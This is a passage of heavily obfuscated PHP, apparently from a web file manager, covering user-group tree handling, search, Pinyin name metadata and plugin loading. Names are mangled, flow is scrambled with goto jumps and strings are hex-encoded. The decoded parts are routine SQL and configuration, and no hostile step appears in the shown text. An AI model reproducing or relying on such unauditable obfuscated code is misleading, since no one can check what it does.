$F­ŸŒ¬²í[$dêßÚÃä¡õ[457]] . $dêßÚÃä¡õ[47]; $this->_changeChildLevel($b´†Š¶ø”‚, $Bß· ËåÄ); } } if (isset($F­ŸŒ¬²í[$dêßÚÃä¡õ[28]])) { $this->setNamePinyin($A´¡½šÁõè, $F­ŸŒ¬²í[$dêßÚÃä¡õ[28]]); } return $this->where(array($dêßÚÃä¡õ[2151] => $A´¡½šÁõè))->save($F­ŸŒ¬²í); } private function _changeChildLevel($b³°Ÿâ«¬, $D¨Ëª…—À¯, $D×ºàÅŞ¹ = false) { goto d©‚¥…Û³; Bà¯Ç³¿¤Ó: $this->where($DŠâò‘ÃÓ)->data($f‡ãÈÍ—‚)->save(); goto a÷‰¾ØËš; AË»˜¶Ê: if ($D×ºàÅŞ¹) { $aÌÙ…‹†Ì¹ = $D¨Ëª…—À¯[$bö¼Ø“–©Å[455]] . $D¨Ëª…—À¯[$bö¼Ø“–©Å[2079]] . $bö¼Ø“–©Å[47]; } $DŠâò‘ÃÓ = array($bö¼Ø“–©Å[521] => array($bö¼Ø“–©Å[479], $b³°Ÿâ«¬[$bö¼Ø“–©Å[455]] . $b³°Ÿâ«¬[$bö¼Ø“–©Å[2079]] . $bö¼Ø“–©Å[480])); $f‡ãÈÍ—‚ = array($bö¼Ø“–©Å[521] => array($bö¼Ø“–©Å[530], "\162\145\160\x6c\141\x63\x65\50\x70\x61\x72\x65\156\x74\x4c\x65\166\145\x6c\54\x27{$aœ‚›ŸøÅ‘}\x27\54\47{$aÌÙ…‹†Ì¹}\x27\x29")); goto Bà¯Ç³¿¤Ó; d©‚¥…Û³: $bö¼Ø“–©Å =& $_SERVER[Äº¡•ô™Ÿ]; $aœ‚›ŸøÅ‘ = $b³°Ÿâ«¬[$bö¼Ø“–©Å[455]] . $b³°Ÿâ«¬[$bö¼Ø“–©Å[2079]] . $bö¼Ø“–©Å[47]; $aÌÙ…‹†Ì¹ = $D¨Ëª…—À¯[$bö¼Ø“–©Å[455]] . $D¨Ëª…—À¯[$bö¼Ø“–©Å[2079]] . $bö¼Ø“–©Å[47] . $b³°Ÿâ«¬[$bö¼Ø“–©Å[2079]] . $bö¼Ø“–©Å[47]; goto AË»˜¶Ê; a÷‰¾ØËš: } public function setNamePinyin($A“ÙÔÂÚ³Õ, $e„µµÖÖÕŠ = false) { $eÔ¬©å‡† =& $_SERVER[Äº¡•ô™Ÿ]; if (!$e„µµÖÖÕŠ) { $cêœïè±‰ø = $this->getInfoSimple($A“ÙÔÂÚ³Õ); $e„µµÖÖÕŠ = $cêœïè±‰ø[$eÔ¬©å‡†[28]]; } if (!Input::check($e„µµÖÖÕŠ, $eÔ¬©å‡†[524])) { $this->metaSet($A“ÙÔÂÚ³Õ, $eÔ¬©å‡†[412], null); $this->metaSet($A“ÙÔÂÚ³Õ, $eÔ¬©å‡†[411], null); return; } $b‰îãÜàÆå = array($eÔ¬©å‡†[412] => str_replace($eÔ¬©å‡†[50], $eÔ¬©å‡†[33], Pinyin::encode($e„µµÖÖÕŠ)), $eÔ¬©å‡†[411] => Pinyin::encode($e„µµÖÖÕŠ, $eÔ¬©å‡†[525])); $this->metaSet($A“ÙÔÂÚ³Õ, $b‰îãÜàÆå); } protected function groupRemove($FõíŒÇ‘„È) { goto b³ÅÕ‚èšß; b³ÅÕ‚èšß: $D‚×œ¿ß¬ =& $_SERVER[Äº¡•ô™Ÿ]; $A‚Çø¹É”´ = array($D‚×œ¿ß¬[2079] => $FõíŒÇ‘„È); $BÅŞ¢¯‹õ = $this->where($A‚Çø¹É”´)->find(); goto cªŒîò–Ìœ; cªŒîò–Ìœ: if (!$BÅŞ¢¯‹õ || $BÅŞ¢¯‹õ[$D‚×œ¿ß¬[457]] == 0) { return !1; } $bÙÎÈÅåéä = $this->getInfoSimple($BÅŞ¢¯‹õ[$D‚×œ¿ß¬[457]]); $this->_changeChildLevel($BÅŞ¢¯‹õ, $bÙÎÈÅåéä, !0); goto Fª´¥¤Ë‚; Fª´¥¤Ë‚: $this->where(array($D‚×œ¿ß¬[457] => $FõíŒÇ‘„È))->save(array($D‚×œ¿ß¬[457] => $BÅŞ¢¯‹õ[$D‚×œ¿ß¬[457]])); Model($D‚×œ¿ß¬[2152])->where($A‚Çø¹É”´)->delete(); Model($D‚×œ¿ß¬[2153])->where($A‚Çø¹É”´)->delete(); goto B˜¶†ĞËƒã; B˜¶†ĞËƒã: Model($D‚×œ¿ß¬[755])->groupRootRemove($FõíŒÇ‘„È); return $this->where($A‚Çø¹É”´)->delete(); goto cŠ·Í°âÉ; cŠ·Í°âÉ: } public function listData() { $dÉ¼àšéæ‰ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dÉ¼àšéæ‰[$_SERVER[Äº¡•ô™Ÿ][351]]); return $dÉ¼àšéæ‰; } private function _makeOrder($fĞ¤½¸ßã† = '') { goto D¡¿±²Ï; D¡¿±²Ï: $F·†‹Ì„­ƒ =& $_SERVER[Äº¡•ô™Ÿ]; $b‰¥‘¦®Üº = array($F·†‹Ì„­ƒ[2079], $F·†‹Ì„­ƒ[28], $F·†‹Ì„­ƒ[2065], $F·†‹Ì„­ƒ[184]); $b­†é“ñ¯Ş = array($F·†‹Ì„­ƒ[398] => $F·†‹Ì„­ƒ[399], $F·†‹Ì„­ƒ[400] => $F·†‹Ì„­ƒ[401]); goto cŒ¨Ï‘ˆè; cÀ²àîŞ†İ: $fĞ¤½¸ßã† = $fĞ¤½¸ßã† . "{$eµïğİÇ¶}\x20{$eæø†ÌÈºÇ}\54\x20\147\x72\157\165\160\x49\104\x20\141\x73\143"; return $this->order($fĞ¤½¸ßã†); goto bƒ´õ´É‡ò; cŒ¨Ï‘ˆè: $eµïğİÇ¶ = Input::get($F·†‹Ì„­ƒ[403], $F·†‹Ì„­ƒ[7], $F·†‹Ì„­ƒ[2151], $b‰¥‘¦®Üº); $eæø†ÌÈºÇ = Input::get($F·†‹Ì„­ƒ[404], $F·†‹Ì„­ƒ[7], $F·†‹Ì„­ƒ[2154], array($F·†‹Ì„­ƒ[2154], $F·†‹Ì„­ƒ[400])); $eæø†ÌÈºÇ = $b­†é“ñ¯Ş[$eæø†ÌÈºÇ]; goto cÀ²àîŞ†İ; bƒ´õ´É‡ò: } public function listChild($CË½˜ƒœËŠ) { $C–­ºâ­´÷ =& $_SERVER[Äº¡•ô™Ÿ]; $A¥±ñÇ™„¿ = $this->where(array($C–­ºâ­´÷[457] => $CË½˜ƒœËŠ))->_makeOrder()->selectPage(200); $this->_listDataApply($A¥±ñÇ™„¿[$C–­ºâ­´÷[351]]); return $A¥±ñÇ™„¿; } public function listByID($B“Õõ’©‚Ç) { $E‹²ÖÀ†…ß =& $_SERVER[Äº¡•ô™Ÿ]; if (!$B“Õõ’©‚Ç) { return array(); } $D¬”ùÖ¦‡ = array($E‹²ÖÀ†…ß[2079] => array($E‹²ÖÀ†…ß[7], $B“Õõ’©‚Ç)); $A«œ¦‘©© = $this->where($D¬”ùÖ¦‡)->select(); $this->_listDataApply($A«œ¦‘©©); return $A«œ¦‘©©; } public function listSearch($fù¹¡¡Ê) { goto eŒğšÀÆõ™; eŒğšÀÆõ™: $F¨—ÆÊŒÛ =& $_SERVER[Äº¡•ô™Ÿ]; $dÍ·Á°·í = $fù¹¡¡Ê[$F¨—ÆÊŒÛ[2155]]; $FÆˆç©ÛÕ® = isset($fù¹¡¡Ê[$F¨—ÆÊŒÛ[2156]]) ? $fù¹¡¡Ê[$F¨—ÆÊŒÛ[2156]] : !1; goto c£âĞ´¶Ò; bˆ°ÏÎù®ã: $this->_listDataApply($dé»¹¶«İ´[$F¨—ÆÊŒÛ[351]]); return $dé»¹¶«İ´; goto D‚»½±ìÖ; a÷Ä·óÎã: $dé»¹¶«İ´ = $this->_makeOrder()->where($b¶ÔêÒ÷¼¸)->selectPage(20); $dé»¹¶«İ´ = $dé»¹¶«İ´ ? $dé»¹¶«İ´ : array(); if (!$dé»¹¶«İ´ || count($dé»¹¶«İ´[$F¨—ÆÊŒÛ[351]]) < 5 && Input::check($dÍ·Á°·í, $F¨—ÆÊŒÛ[303])) { $C‘ ‚’¢ = $this->_searchFromMeta($F¨—ÆÊŒÛ[411], $dÍ·Á°·í, 10); $d½š©ë®ë = $this->_searchFromMeta($F¨—ÆÊŒÛ[412], $dÍ·Á°·í, 10); $B‰Ç«Õ‰Ø• = array_merge($C‘ ‚’¢, $d½š©ë®ë, $dé»¹¶«İ´[$F¨—ÆÊŒÛ[351]]); $dé»¹¶«İ´[$F¨—ÆÊŒÛ[351]] = array_unique_by_key($B‰Ç«Õ‰Ø•, $F¨—ÆÊŒÛ[2079]); $dé»¹¶«İ´[$F¨—ÆÊŒÛ[348]][$F¨—ÆÊŒÛ[349]] = count($dé»¹¶«İ´[$F¨—ÆÊŒÛ[351]]); $dé»¹¶«İ´[$F¨—ÆÊŒÛ[348]][$F¨—ÆÊŒÛ[350]] = ceil($dé»¹¶«İ´[$F¨—ÆÊŒÛ[348]][$F¨—ÆÊŒÛ[349]] / $dé»¹¶«İ´[$F¨—ÆÊŒÛ[348]][$F¨—ÆÊŒÛ[346]]); } goto bˆ°ÏÎù®ã; c£âĞ´¶Ò: if (!trim($dÍ·Á°·í)) { return !1; } $dÍ·Á°·í = str_replace($F¨—ÆÊŒÛ[2157], $F¨—ÆÊŒÛ[2158], $dÍ·Á°·í); $b¶ÔêÒ÷¼¸ = array($F¨—ÆÊŒÛ[2079] => array($F¨—ÆÊŒÛ[754], "\x25{$dÍ·Á°·í}\x25"), $F¨—ÆÊŒÛ[28] => array($F¨—ÆÊŒÛ[754], "\x25{$dÍ·Á°·í}\45"), $F¨—ÆÊŒÛ[916] => $F¨—ÆÊŒÛ[2159]); goto a÷Ä·óÎã; D‚»½±ìÖ: } private function _searchFromMeta($Eè„¥‰À›, $Fæ³ÆÙ‰˜æ, $B×È‡–ñºÀ) { goto Cœ™š©©; Cœ™š©©: $Cˆà§Õ° =& $_SERVER[Äº¡•ô™Ÿ]; $Fæ³ÆÙ‰˜æ = strtolower($Fæ³ÆÙ‰˜æ); $f’ëÍÁ = array($Cˆà§Õ°[89] => $Eè„¥‰À›, $Cˆà§Õ°[356] => array($Cˆà§Õ°[754], "\x25{$Fæ³ÆÙ‰˜æ}\x25")); goto e£ªğë¤¤å; EĞá“Ö¯¿˜: $FÓÁìĞ¤‡± = $this->where(array($Cˆà§Õ°[2151] => array($Cˆà§Õ°[7], $aÇÏŒ‰”Ï)))->select(); if (!$FÓÁìĞ¤‡±) { return array(); } return $FÓÁìĞ¤‡±; goto Cî˜…²äÉñ; e£ªğë¤¤å: $aÇÏŒ‰”Ï = Model($Cˆà§Õ°[2160])->where($f’ëÍÁ)->limit($B×È‡–ñºÀ)->select(); if (!$aÇÏŒ‰”Ï) { return array(); } $aÇÏŒ‰”Ï = array_to_keyvalue($aÇÏŒ‰”Ï, $Cˆà§Õ°[33], $Cˆà§Õ°[2079]); goto EĞá“Ö¯¿˜; Cî˜…²äÉñ: } protected function _listDataApplyItem($d‰ªáŠŠ˜) { $A‡Ïª‰ï°Û = array($d‰ªáŠŠ˜); $this->_listDataApply($A‡Ïª‰ï°Û); return $A‡Ïª‰ï°Û[0]; } protected function _listDataApply(&$d§ÇóËƒÇ‡) { goto cëÖ”’¿ëÕ; cáØ²”¬: $this->_listAppendParent($d§ÇóËƒÇ‡); $this->_listAppendSourceRoot($d§ÇóËƒÇ‡, $bÔ‘ä„–…„); goto f½ËÚİíÌ; cëÖ”’¿ëÕ: $båÇ’ƒÉÏø =& $_SERVER[Äº¡•ô™Ÿ]; if (!$d§ÇóËƒÇ‡) { return; } $bÔ‘ä„–…„ = array_to_keyvalue($d§ÇóËƒÇ‡, $båÇ’ƒÉÏø[33], $båÇ’ƒÉÏø[2079]); goto Cà§Ú¿¢ºÊ; Cà§Ú¿¢ºÊ: $this->_listAppendChildren($d§ÇóËƒÇ‡); $this->_listAppendChildrenMember($d§ÇóËƒÇ‡); $this->_listAppendMeta($d§ÇóËƒÇ‡, $bÔ‘ä„–…„); goto cáØ²”¬; f½ËÚİíÌ: } private function _listAppendChildren(&$aí…áè–â®) { goto b‚èö½·; e‰”ÚÅÚÀ¥: $AÂ­ĞáÀñ = array_to_keyvalue($AÂ­ĞáÀñ, $CÔ‚Àğ¡Ì[446]); foreach ($aí…áè–â® as &$C×ĞÊ¬ˆ©) { $C×ĞÊ¬ˆ©[$CÔ‚Àğ¡Ì[2161]] = isset($AÂ­ĞáÀñ[$C×ĞÊ¬ˆ©[$CÔ‚Àğ¡Ì[2079]] . $CÔ‚Àğ¡Ì[2162]]); } goto DÒÜÚªéÖï; aŞˆ³æ£Û: $dŠä¡Æµ‰ô = count($aí…áè–â®); $b®±ãø÷µš = $this->tablePrefix . $this->tableName; for ($C„¢Ş±ÊÔ = 0, $cèµëŸ’Š‰ = 0; $C„¢Ş±ÊÔ < $dŠä¡Æµ‰ô; $C„¢Ş±ÊÔ++) { $cèµëŸ’Š‰++; $aµ’¯ÅŞ = $aí…áè–â®[$C„¢Ş±ÊÔ][$CÔ‚Àğ¡Ì[2079]]; $C¯ª…šœ‚å .= "\123\x45\x4c\105\x43\x54\x20\52\40\x46\122\117\115\40\50\x53\x45\114\105\103\124\x20\47{$aµ’¯ÅŞ}\137\x63\x68\x69\154\144\x27\x20\x61\x73\x20\x68\x61\163\x20\106\x52\x4f\x4d\40\x60{$b®±ãø÷µš}\x60\x20\167\150\x65\162\x65\x20\160\141\162\145\x6e\x74\x49\104\75{$aµ’¯ÅŞ}\x20\154\151\x6d\x69\x74\x20\x31\51\x20\x61\163\x20\x74\142\x5f{$aµ’¯ÅŞ}\x20\165\x6e\x69\x6f\156\x20\x61\154\154\x20"; if (($cèµëŸ’Š‰ >= 20 || $C„¢Ş±ÊÔ == $dŠä¡Æµ‰ô - 1) && $C¯ª…šœ‚å) { $C¯ª…šœ‚å = substr($C¯ª…šœ‚å, 0, -strlen($CÔ‚Àğ¡Ì[445])); $b¨¤Ó÷ä = $this->query($C¯ª…šœ‚å); $AÂ­ĞáÀñ = array_merge($AÂ­ĞáÀñ, $b¨¤Ó÷ä); $cèµëŸ’Š‰ = 0; $C¯ª…šœ‚å = $CÔ‚Àğ¡Ì[33]; } } goto e‰”ÚÅÚÀ¥; b‚èö½·: $CÔ‚Àğ¡Ì =& $_SERVER[Äº¡•ô™Ÿ]; $C¯ª…šœ‚å = $CÔ‚Àğ¡Ì[358]; $AÂ­ĞáÀñ = array(); goto aŞˆ³æ£Û; DÒÜÚªéÖï: } private function _listAppendChildrenMember(&$CÚâÇ……™) { goto dÜæ‚ù¡¤¹; FóÔ‘–æ°Ü: $e‡¶ˆ†İé‘ = array_to_keyvalue($e‡¶ˆ†İé‘, $e”–éì¼Ø [446]); foreach ($CÚâÇ……™ as &$C÷¬É£±º) { $C÷¬É£±º[$e”–éì¼Ø [2163]] = isset($e‡¶ˆ†İé‘[$C÷¬É£±º[$e”–éì¼Ø [2079]] . $e”–éì¼Ø [2162]]); } goto bÔ„êóÛàÅ; dÜæ‚ù¡¤¹: $e”–éì¼Ø  =& $_SERVER[Äº¡•ô™Ÿ]; $A·ÙÇöê˜ê = $e”–éì¼Ø [358]; $e‡¶ˆ†İé‘ = array(); goto fÔçßõÃí; fÔçßõÃí: $C÷ÉÎì…À¸ = count($CÚâÇ……™); $dŞäŞ†‹¢Â = $this->tablePrefix . $e”–éì¼Ø [2153]; for ($E—´¥÷Ğ = 0, $C›‡ÇÚº¾„ = 0; $E—´¥÷Ğ < $C÷ÉÎì…À¸; $E—´¥÷Ğ++) { $C›‡ÇÚº¾„++; $DİÃÚŠ¹‰ = $CÚâÇ……™[$E—´¥÷Ğ][$e”–éì¼Ø [2079]]; $A·ÙÇöê˜ê .= "\123\x45\114\105\103\x54\40\x2a\x20\x46\122\117\115\x20\x28\123\105\x4c\x45\103\x54\40\x27{$DİÃÚŠ¹‰}\x5f\x63\x68\x69\x6c\144\47\x20\x61\163\x20\x68\141\x73\40\x46\x52\x4f\115\x20\140{$dŞäŞ†‹¢Â}\140\x20\x77\150\145\162\x65\x20\147\162\x6f\x75\x70\x49\x44\x3d{$DİÃÚŠ¹‰}\40\x6c\151\155\151\x74\40\61\x29\40\x61\x73\40\164\142\x5f{$DİÃÚŠ¹‰}\40\165\x6e\x69\x6f\156\40\141\x6c\x6c\x20"; if (($C›‡ÇÚº¾„ >= 20 || $E—´¥÷Ğ == $C÷ÉÎì…À¸ - 1) && $A·ÙÇöê˜ê) { $A·ÙÇöê˜ê = substr($A·ÙÇöê˜ê, 0, -strlen($e”–éì¼Ø [445])); $d¢…ˆ©®­İ = $this->query($A·ÙÇöê˜ê); $e‡¶ˆ†İé‘ = array_merge($e‡¶ˆ†İé‘, $d¢…ˆ©®­İ); $C›‡ÇÚº¾„ = 0; $A·ÙÇöê˜ê = $e”–éì¼Ø [33]; } } goto FóÔ‘–æ°Ü; bÔ„êóÛàÅ: } private function _listAppendMeta(&$a­§ÊÃ§Üë, $AĞ—«×’Š) { $a£î‹µ¢‚÷ =& $_SERVER[Äº¡•ô™Ÿ]; $eˆ­·ÌòÉï = array($a£î‹µ¢‚÷[2079] => array($a£î‹µ¢‚÷[7], $AĞ—«×’Š)); $Fó´Üæ‚–ä = Model($a£î‹µ¢‚÷[2152])->where($eˆ­·ÌòÉï)->select(); $Fó´Üæ‚–ä = array_to_keyvalue_group($Fó´Üæ‚–ä, $a£î‹µ¢‚÷[2079]); foreach ($Fó´Üæ‚–ä as &$eùçäÏ¨) { $eùçäÏ¨ = array_to_keyvalue($eùçäÏ¨, $a£î‹µ¢‚÷[89], $a£î‹µ¢‚÷[356]); } foreach ($a­§ÊÃ§Üë as &$CÃö„“”‹¸) { $CÃö„“”‹¸[$a£î‹µ¢‚÷[413]] = array(); if (isset($Fó´Üæ‚–ä[$CÃö„“”‹¸[$a£î‹µ¢‚÷[2079]]])) { $CÃö„“”‹¸[$a£î‹µ¢‚÷[413]] = $Fó´Üæ‚–ä[$CÃö„“”‹¸[$a£î‹µ¢‚÷[2079]]]; } } } protected function parentLevelArray($DšÉÉ—ë¦) { $e¶¼• ¬ƒ† =& $_SERVER[Äº¡•ô™Ÿ]; $DšÉÉ—ë¦ = explode($e¶¼• ¬ƒ†[47], trim($DšÉÉ—ë¦, $e¶¼• ¬ƒ†[47])); $DšÉÉ—ë¦ = array_remove_value($DšÉÉ—ë¦, $e¶¼• ¬ƒ†[464]); return $DšÉÉ—ë¦; } private function _listAppendParent(&$Cõˆ‰ƒ—) { goto FƒŒ„ŸñÑ; FƒŒ„ŸñÑ: $bò¢Şîø¦ =& $_SERVER[Äº¡•ô™Ÿ]; $E‡‘Şñ‹ø = array(); foreach ($Cõˆ‰ƒ— as &$b¹ËìÂãµî) { $E‡‘Şñ‹ø[$b¹ËìÂãµî[$bò¢Şîø¦[2079]]] = $b¹ËìÂãµî[$bò¢Şîø¦[28]]; $aÑøª¡ÏÛ = $this->parentLevelArray($b¹ËìÂãµî[$bò¢Şîø¦[455]]); foreach ($aÑøª¡ÏÛ as $E†Æ‹Ÿ´¬) { if (!isset($E‡‘Şñ‹ø[$E†Æ‹Ÿ´¬])) { $E‡‘Şñ‹ø[$E†Æ‹Ÿ´¬] = 0; } } } goto BÛÃáƒ‘Æ; BÛÃáƒ‘Æ: $EôÛ×Ø‘ï = array(); foreach ($E‡‘Şñ‹ø as $eÉÓëˆ§ˆ => $F»áì§©¿) { if (!$F»áì§©¿) { $EôÛ×Ø‘ï[] = $eÉÓëˆ§ˆ; } } if ($EôÛ×Ø‘ï) { $F„Œ¢ªÔäù = array($bò¢Şîø¦[2151] => array($bò¢Şîø¦[381], $EôÛ×Ø‘ï)); $Eôêôè½æÊ = $this->field($bò¢Şîø¦[2164])->where($F„Œ¢ªÔäù)->select(); $E­ö»¤¿ª¢ = array_to_keyvalue($Eôêôè½æÊ, $bò¢Şîø¦[2079], $bò¢Şîø¦[28]); $E‡‘Şñ‹ø = array_merge_index($E‡‘Şñ‹ø, $E­ö»¤¿ª¢); } goto DÑóË¨æ’Ò; DÑóË¨æ’Ò: foreach ($Cõˆ‰ƒ— as &$b¹ËìÂãµî) { $aÑøª¡ÏÛ = $this->parentLevelArray($b¹ËìÂãµî[$bò¢Şîø¦[455]]); $f…®¿ˆ—Ğö = $bò¢Şîø¦[33]; foreach ($aÑøª¡ÏÛ as $E†Æ‹Ÿ´¬) { $f…®¿ˆ—Ğö .= $E‡‘Şñ‹ø[$E†Æ‹Ÿ´¬] . $bò¢Şîø¦[8]; } if ($aÑøª¡ÏÛ) { $f…®¿ˆ—Ğö .= $b¹ËìÂãµî[$bò¢Şîø¦[28]]; } $b¹ËìÂãµî[$bò¢Şîø¦[459]] = str_replace($bò¢Şîø¦[463], $bò¢Şîø¦[8], $f…®¿ˆ—Ğö); } goto a–½ĞÎ…±¿; a–½ĞÎ…±¿: } private function _listAppendSourceRoot(&$b¼ìÉÍ×§×, $DæßÑ³ºŠĞ) { goto BÔ¦ÈÑë‰ˆ; BÔ¦ÈÑë‰ˆ: $aÇ‚»òòÅ =& $_SERVER[Äº¡•ô™Ÿ]; $e¶¡Ñö ² = array($aÇ‚»òòÅ[368] => SourceModel::TYPE_GROUP, $aÇ‚»òòÅ[457] => 0, $aÇ‚»òòÅ[452] => array($aÇ‚»òòÅ[7], $DæßÑ³ºŠĞ)); $BŠä¦Öøî­ = $aÇ‚»òòÅ[2165]; goto aŒÄÛ‰¸†; aŒÄÛ‰¸†: $Eç½ÊÒ§§œ = Model($aÇ‚»òòÅ[755])->order($aÇ‚»òòÅ[2166])->field($BŠä¦Öøî­)->where($e¶¡Ñö ²)->select(); $Eç½ÊÒ§§œ = array_to_keyvalue($Eç½ÊÒ§§œ, $aÇ‚»òòÅ[452]); $Eç½ÊÒ§§œ = array_remove_key($Eç½ÊÒ§§œ, $aÇ‚»òòÅ[452]); goto eÙš‘ÒäÕ˜; eÙš‘ÒäÕ˜: foreach ($b¼ìÉÍ×§× as &$A¬À¨ñø­) { $A¬À¨ñø­[$aÇ‚»òòÅ[388]] = $Eç½ÊÒ§§œ[$A¬À¨ñø­[$aÇ‚»òòÅ[2079]]] ? $Eç½ÊÒ§§œ[$A¬À¨ñø­[$aÇ‚»òòÅ[2079]]] : array(); } goto aŸ—¥Á šÄ; aŸ—¥Á šÄ: } protected function resetParentLevel() { $f‰ï¬‘ó‰ =& $_SERVER[Äº¡•ô™Ÿ]; $a‘¤È™Š‹… = $f‰ï¬‘ó‰[2079]; $Aõ…Ó»…®© = $this->select(); $Aõ…Ó»…®© = array_to_keyvalue($Aõ…Ó»…®©, $a‘¤È™Š‹…); foreach ($Aõ…Ó»…®© as $fÜ×ÖÎ‘·) { goto DäÛ°èˆÎê; b Å™º”¹ï: $this->where(array($a‘¤È™Š‹… => $fÜ×ÖÎ‘·[$a‘¤È™Š‹…]))->save(array($f‰ï¬‘ó‰[521] => $E•„Ó£‹òÆ)); goto c°›‚†‰Â»; DäÛ°èˆÎê: $fß¨ÊÊ¢ªë = $fÜ×ÖÎ‘·; $E•„Ó£‹òÆ = array(); while ($fß¨ÊÊ¢ªë[$f‰ï¬‘ó‰[457]] != 0) { $E•„Ó£‹òÆ[] = $fß¨ÊÊ¢ªë[$f‰ï¬‘ó‰[457]]; $fß¨ÊÊ¢ªë = $Aõ…Ó»…®©[$fß¨ÊÊ¢ªë[$f‰ï¬‘ó‰[457]]]; } goto d¼›¬§ö; d¼›¬§ö: $E•„Ó£‹òÆ[] = 0; $E•„Ó£‹òÆ = $f‰ï¬‘ó‰[47] . implode($f‰ï¬‘ó‰[47], array_reverse($E•„Ó£‹òÆ)) . $f‰ï¬‘ó‰[47]; $this->setNamePinyin($fÜ×ÖÎ‘·[$a‘¤È™Š‹…], $fÜ×ÖÎ‘·[$f‰ï¬‘ó‰[28]]); goto b Å™º”¹ï; c°›‚†‰Â»: } return $Aõ…Ó»…®©; } public function groupNameAuto($e‚¯¤­†¥, $DŠ´‘Ò£ËË) { $DàØÏå¥ÇÒ =& $_SERVER[Äº¡•ô™Ÿ]; $Fê‘òºÆê¬ = $this->where(array($DàØÏå¥ÇÒ[365] => $e‚¯¤­†¥))->getField($DàØÏå¥ÇÒ[28], !0); if (!$Fê‘òºÆê¬ || !in_array($DŠ´‘Ò£ËË, $Fê‘òºÆê¬)) { return $DŠ´‘Ò£ËË; } for ($aÙæÍ·’¿ = 1; $aÙæÍ·’¿ <= count($Fê‘òºÆê¬) + 1; $aÙæÍ·’¿++) { $cù«—¤’É = $DŠ´‘Ò£ËË . "\x28{$aÙæÍ·’¿}\51"; if (!in_array($cù«—¤’É, $Fê‘òºÆê¬)) { return $cù«—¤’É; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\x70\x6c\x75\x67\151\x6e\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x74\141\x74\x75\163", "\162\x65\x67\151\145\x73\x74", "\x63\157\x6e\x66\151\147"); public function loadList($AÍ¤ƒ§¯ÈÑ = false) { $CÛİ§ò¦é¤ = array_to_keyvalue($this->listData(), $_SERVER[Äº¡•ô™Ÿ][28]); if ($AÍ¤ƒ§¯ÈÑ) { return $CÛİ§ò¦é¤[$AÍ¤ƒ§¯ÈÑ]; } return $CÛİ§ò¦é¤; } public function init() { $DÃ×©Ş¬… =& $_SERVER[Äº¡•ô™Ÿ]; Hook::trigger($DÃ×©Ş¬…[2167]); $c®§¯Ìö = $this->loadPluginList(); foreach ($c®§¯Ìö as $D‚¤êˆ§Ä => $DİÉ²Õˆ³¤) { $eæÊÑŠˆÒ® = $this->appAllow($D‚¤êˆ§Ä, $DİÉ²Õˆ³¤); if (!$eæÊÑŠˆÒ®) { continue; } foreach ($DİÉ²Õˆ³¤[$DÃ×©Ş¬…[2168]] as $e×¶“ëõÃÉ => $DÁ¼ôöñ›É) { Hook::bind($e×¶“ëõÃÉ, $DÁ¼ôöñ›É); } } Hook::trigger($DÃ×©Ş¬…[2169]); Hook::trigger(ACTION); } public function appAllow($c›ŞÚ¯ô…¸, $cœˆ•»•·Ì, $D‰¥ÁÂºŞœ = true) { $fùÈ¤›¾ëÎ =& $_SERVER[Äº¡•ô™Ÿ]; $Cåª¡‰©’ƒ = PLUGIN_DIR . $c›ŞÚ¯ô…¸ . $fùÈ¤›¾ëÎ[2170]; if (!is_array($cœˆ•»•·Ì) || !is_array($cœˆ•»•·Ì[$fùÈ¤›¾ëÎ[2168]]) || !is_file($Cåª¡‰©’ƒ) || $cœˆ•»•·Ì[$fùÈ¤›¾ëÎ[692]] != 1) { return !1; } if ($D‰¥ÁÂºŞœ && !Action($fùÈ¤›¾ëÎ[2171])->checkAuth($c›ŞÚ¯ô…¸)) { return !1; } return !0; } public function unInstall($c»ò»ØŸ³á) { $dËó§°ïÏ¤ =& $_SERVER[Äº¡•ô™Ÿ]; $b­²¡ªÀ’» = $this->loadList($c»ò»ØŸ³á); if (file_exists(PLUGIN_DIR . $c»ò»ØŸ³á)) { Hook::apply($c»ò»ØŸ³á . $dËó§°ïÏ¤[2172]); } $this->remove($b­²¡ªÀ’»[$dËó§°ïÏ¤[364]]); } public function changeStatus($A«®Ïğ’ÂŒ, $Cëì…éœ¿Œ) { $aÅáïã°ç» =& $_SERVER[Äº¡•ô™Ÿ]; $A…Àè³’Æ¤ = $this->loadList($A«®Ïğ’ÂŒ); if ($Cëì…éœ¿Œ) { Hook::apply($A«®Ïğ’ÂŒ . $aÅáïã°ç»[2173]); } $this->update($A…Àè³’Æ¤[$aÅáïã°ç»[364]], array($aÅáïã°ç»[2174] => $Cëì…éœ¿Œ)); } public function appRegist($B¨°ïÆù, $F¼±´©Õ›) { $EÏä…á¹‡© =& $_SERVER[Äº¡•ô™Ÿ]; $Fëã”Í´‰Ø = $this->loadList($B¨°ïÆù); if ($Fëã”Í´‰Ø) { $this->update($Fëã”Í´‰Ø[$EÏä…á¹‡©[364]], array($EÏä…á¹‡©[2168] => $F¼±´©Õ›)); } else { $FÑ“›ÜË—… = array($EÏä…á¹‡©[28] => $B¨°ïÆù, $EÏä…á¹‡©[2168] => $F¼±´©Õ›, $EÏä…á¹‡©[692] => 0, $EÏä…á¹‡©[6] => $this->getConfigDefault($B¨°ïÆù)); $this->insert($FÑ“›ÜË—…); } } public function getConfigDefault($CÀ‘ï…‡„•) { $CÂšàˆ =& $_SERVER[Äº¡•ô™Ÿ]; $F˜Ç§èõŠ‘ = array(); $céù¶ºÑÜô = $this->getPackageJson($CÀ‘ï…‡„•); if (!$céù¶ºÑÜô && is_array($céù¶ºÑÜô[$CÂšàˆ[2175]])) { return $F˜Ç§èõŠ‘; } foreach ($céù¶ºÑÜô[$CÂšàˆ[2175]] as $D±µ†œé»› => $Cİ³¬ÄÁ³Æ) { if (!isset($Cİ³¬ÄÁ³Æ[$CÂšàˆ[356]]) || isset($F˜Ç§èõŠ‘[$D±µ†œé»›])) { continue; } $F˜Ç§èõŠ‘[$D±µ†œé»›] = $Cİ³¬ÄÁ³Æ[$CÂšàˆ[356]]; } return $F˜Ç§èõŠ‘; } public function getPackageJson($FÉ’“ßµö¢) { return Hook::apply($FÉ’“ßµö¢ . $_SERVER[Äº¡•ô™Ÿ][2176]); } public function getConfig($dƒò…·“Ç„, $c³°ÎØ‘ = false) { $DÆ£¸‹†æ¸ =& $_SERVER[Äº¡•ô™Ÿ]; $EÁ†Ñç®½ = array(); $c—è öœÂÈ = $this->loadList($dƒò…·“Ç„); if ($c—è öœÂÈ && is_array($c—è öœÂÈ[$DÆ£¸‹†æ¸[6]])) { $EÁ†Ñç®½ = $c—è öœÂÈ[$DÆ£¸‹†æ¸[6]]; } if 